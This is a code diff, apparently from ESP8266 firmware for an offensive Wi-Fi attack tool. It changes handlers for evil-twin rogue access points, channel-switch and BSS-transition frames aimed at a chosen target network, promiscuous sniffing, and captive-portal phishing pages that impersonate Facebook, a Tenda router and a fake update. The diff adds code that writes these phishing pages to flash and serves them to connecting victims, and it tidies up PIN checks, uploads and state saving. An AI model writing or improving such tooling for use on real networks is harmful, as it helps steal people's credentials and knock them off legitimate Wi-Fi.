@@ -55,7 +55,6 @@ static const char criticalActionTable[] PROGMEM =
   "clear_logs\0clear_probes\0clear_clients\0pin_set\0pin_clear\0"
   "hide_ap\0auto_select";
 #define CRITICAL_COUNT 35
-#define SENSITIVE_COUNT 27
 
 static bool stringInTable(const String& a, const char table[], int count) {
   const char* p = table;
@@ -188,13 +187,30 @@ String getDNSLogHTML() {
 
 String getLangTable() {
   String rows;
+  char buf[64];
   for (int i = 0; i < langCount; i++) {
-    rows += "<tr><td>" + String(langTable[i].key) + "</td><td>" + String(langTable[i].en) + "</td><td>" + String(langTable[i].id) + "</td></tr>";
+    const char* k = (const char*)pgm_read_ptr(&langTable[i].key);
+    strcpy_P(buf, k);
+    rows += "<tr><td>" + String(buf) + "</td><td>";
+    const char* e = (const char*)pgm_read_ptr(&langTable[i].en);
+    strcpy_P(buf, e);
+    rows += String(buf) + "</td><td>";
+    const char* d = (const char*)pgm_read_ptr(&langTable[i].id);
+    strcpy_P(buf, d);
+    rows += String(buf) + "</td></tr>";
   }
   return rows;
 }
 
 void savePhishingPages() {
+  const char* files[5] = {"/facebook.html", "/tenda.html", "/generic.html", "/update.html", "/landing.html"};
+  const char* const pages[5] = {FACEBOOK_HTML, TENDA_HTML, GENERIC_HTML, UPDATE_HTML, LANDING_HTML};
+  for (int i = 0; i < 5; i++) {
+    if (!LittleFS.exists(files[i])) {
+      File f = LittleFS.open(files[i], "w");
+      if (f) { f.print(FPSTR(pages[i])); f.close(); }
+    }
+  }
 }
 
 void saveBeaconSSIDs() {
@@ -305,7 +321,7 @@ void loadState() {
 #define CONTENT_JSON F("application/json")
 
 static bool checkPin(AsyncWebServerRequest *request, const String& action) {
-  if (webPin.length() > 0 && !pinUnlocked && stringInTable(action, criticalActionTable, SENSITIVE_COUNT)) {
+  if (webPin.length() > 0 && !pinUnlocked && stringInTable(action, criticalActionTable, CRITICAL_COUNT)) {
     request->send(200, F("text/html"), buildPinPage(currentLang, pinAttempts, pinLockoutUntil > 0));
     return false;
   }
@@ -434,7 +450,7 @@ void handleRoot(AsyncWebServerRequest *request) {
         genRandomMAC(fakeBSSID);
         sendCSA(selectedNetwork.ch, selectedNetwork.bssid, selectedNetwork.ssid,
                 (selectedNetwork.ch % 13) + 1);
-        sendBSSTransitionRequest(selectedNetwork.ch, selectedNetwork.bssid, fakeBSSID, fakeBSSID);
+        sendBSSTransitionRequest(selectedNetwork.ch, selectedNetwork.bssid, fakeBSSID);
         beaconActive = true;
         rogueAPActive = true;
         startEvilTwin(&dnsServer, selectedNetwork.ssid);
@@ -483,7 +499,7 @@ void handleRoot(AsyncWebServerRequest *request) {
     }
     else if (a == "rogue_ap_stop") { rogueAPActive = false; stopEvilTwin(&dnsServer); dirtyState = true; markSave(SAVE_CRITICAL); }
     else if (a == "stop_all") { stopAllAttacks(); markSave(SAVE_CRITICAL); }
-    else if (a == "reboot") { request->send(200, CONTENT_PLAIN, "OK"); ESP.restart(); return; }
+    else if (a == "reboot") { request->send(200, CONTENT_PLAIN, "OK"); delay(100); ESP.restart(); return; }
     else if (a == "reset") {
       stopAllAttacks();
       WiFi.softAPdisconnect(true); delay(100);
@@ -492,7 +508,7 @@ void handleRoot(AsyncWebServerRequest *request) {
       WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255,255,255,0));
       WiFi.softAP(AP_SSID, AP_PASS);
       wifiClientConnected = false; wifiClientSSID = ""; wifiClientPassword = "";
-      wifiClientStatus = WL_DISCONNECTED; internetSharingEnabled = false;
+      internetSharingEnabled = false;
       probeCount = 0; clientCount = 0; capturedCount = 0;
       dirtyState = true; markSave(SAVE_CRITICAL); addLog("Factory reset done");
     }
@@ -521,7 +537,7 @@ void handleRoot(AsyncWebServerRequest *request) {
       if (internetSharingEnabled) internetSharing(false);
       WiFi.disconnect(); wifiConnState = WIFI_IDLE;
       wifiClientConnected = false; wifiClientSSID = ""; wifiClientPassword = "";
-      wifiClientStatus = WL_DISCONNECTED; internetSharingEnabled = false;
+      internetSharingEnabled = false;
       addLog("WiFi disconnected");
       dirtyState = true; markSave(SAVE_CRITICAL);
     }
@@ -586,13 +602,10 @@ void handleRoot(AsyncWebServerRequest *request) {
     else if (a == "clear") { selectedNetwork.ssid = ""; selectedNetwork.ch = 0; for (int i=0;i<6;i++) selectedNetwork.bssid[i]=0; dirtyState = true; markSave(SAVE_CRITICAL); addLog("Target cleared"); }
     else if (a == "hide_ap") {
       apHidden = !apHidden;
-      if (apHidden) {
-        WiFi.softAPdisconnect(false);
-        addLog("AP hidden");
-      } else {
-        WiFi.softAP(AP_SSID, AP_PASS);
-        addLog("AP visible");
-      }
+      WiFi.softAPdisconnect(true);
+      delay(100);
+      WiFi.softAP(AP_SSID, AP_PASS, 1, apHidden);
+      addLog(apHidden ? "AP hidden" : "AP visible");
       dirtyState = true; markSave(SAVE_CRITICAL);
     }
     else if (a == "extender_scan") {
@@ -712,8 +725,8 @@ void handleRoot(AsyncWebServerRequest *request) {
 
   if (hotspotActive) {
     String page;
-    static const char* const fileNames[] = {"/facebook.html", "/tenda.html", "/generic.html", "/update.html", "/landing.html"};
-    static const int fileIndices[] = {PHISHING_FACEBOOK, PHISHING_TENDA, PHISHING_GENERIC, PHISHING_UPDATE, PHISHING_LANDING};
+    static const char fileNames[] PROGMEM = "/facebook.html\0/tenda.html\0/generic.html\0/update.html\0/landing.html";
+    static const int fileIndices[] PROGMEM = {PHISHING_FACEBOOK, PHISHING_TENDA, PHISHING_GENERIC, PHISHING_UPDATE, PHISHING_LANDING};
 
     if (currentPhishingPage == PHISHING_CUSTOM && hasCustomHTML) {
       Dir d = LittleFS.openDir("/");
@@ -728,11 +741,18 @@ void handleRoot(AsyncWebServerRequest *request) {
     }
     if (page.length() == 0) {
       bool loadedFromFile = false;
+      char fileNameBuf[32];
       for (int fi = 0; fi < 5; fi++) {
-        if (currentPhishingPage == (uint8_t)fileIndices[fi] && LittleFS.exists(fileNames[fi])) {
-          File f = LittleFS.open(fileNames[fi], "r");
-          if (f) { page = f.readString(); f.close(); loadedFromFile = true; }
-          break;
+        int idx = pgm_read_word(&fileIndices[fi]);
+        if (currentPhishingPage == (uint8_t)idx) {
+          const char* fp = fileNames;
+          for (int fn = 0; fn < fi; fn++) fp += strlen_P(fp) + 1;
+          strcpy_P(fileNameBuf, fp);
+          if (LittleFS.exists(fileNameBuf)) {
+            File f = LittleFS.open(fileNameBuf, "r");
+            if (f) { page = f.readString(); f.close(); loadedFromFile = true; }
+            break;
+          }
         }
       }
       if (!loadedFromFile) {
@@ -852,33 +872,31 @@ void handleEdit(AsyncWebServerRequest *request) {
   } else { request->send(400, CONTENT_PLAIN, "No file specified"); }
 }
 
+static String uploadPath = "";
 void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final) {
   if (!index) {
-    String fn = filename;
-    if (fn.startsWith("/")) fn = fn.substring(1);
-    fn = "/" + fn;
-    if (fn == "/custom.html") hasCustomHTML = true;
+    uploadPath = filename;
+    if (!uploadPath.startsWith("/")) uploadPath = "/" + uploadPath;
+    uploadPath.replace("//", "/");
+    if (uploadPath == "/custom.html") hasCustomHTML = true;
   }
-  if (len > 0) {
-    String fn = "/" + filename;
-    fn.replace("//", "/");
-    File f = LittleFS.open(fn, "a");
+  if (len > 0 && uploadPath.length() > 0) {
+    File f = LittleFS.open(uploadPath, (index == 0) ? "w" : "a");
     if (f) { f.write(data, len); f.close(); }
   }
   if (final) {
-    // handled by the POST handler below
+    uploadPath = "";
   }
 }
 
 void handleUploadConfig(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final) {
-  if (!index) {
-    // start
-  }
   if (len > 0) {
-    File f = LittleFS.open("/state.json", "w");
+    File f = LittleFS.open("/state.json.tmp", (index == 0) ? "w" : "a");
     if (f) { f.write(data, len); f.close(); }
   }
   if (final) {
+    LittleFS.remove("/state.json");
+    LittleFS.rename("/state.json.tmp", STATE_CFG_FILE);
     loadState();
   }
 }
@@ -893,12 +911,12 @@ void setup() {
 
   hasCustomHTML = LittleFS.exists("/custom.html") || LittleFS.exists("/custom");
 
+  WiFi.mode(WIFI_AP_STA);
+
   loadState();
   initOTASecret();
   startTime = millis();
   lastStateSave = millis();
-
-  WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
   wifi_set_promiscuous_rx_cb(promiscuousCallback);
 
@@ -1015,7 +1033,6 @@ void loop() {
       wifiClientConnected = true;
       wifiClientSSID = wifiPendingSSID.length() > 0 ? wifiPendingSSID : wifiClientSSID;
       wifiClientPassword = wifiPendingPass.length() > 0 ? wifiPendingPass : wifiClientPassword;
-      wifiClientStatus = WL_CONNECTED;
       wifiConnState = WIFI_IDLE;
       wifiPendingSSID = ""; wifiPendingPass = "";
       addLog("WiFi connected: " + wifiClientSSID);
@@ -1026,7 +1043,6 @@ void loop() {
       wifiConnState = WIFI_IDLE;
       wifiPendingSSID = ""; wifiPendingPass = "";
       wifiClientConnected = false;
-      wifiClientStatus = WL_DISCONNECTED;
       addLog("WiFi connect timeout", LOG_WARN);
       dirtyState = true;
       markSave(SAVE_CRITICAL);
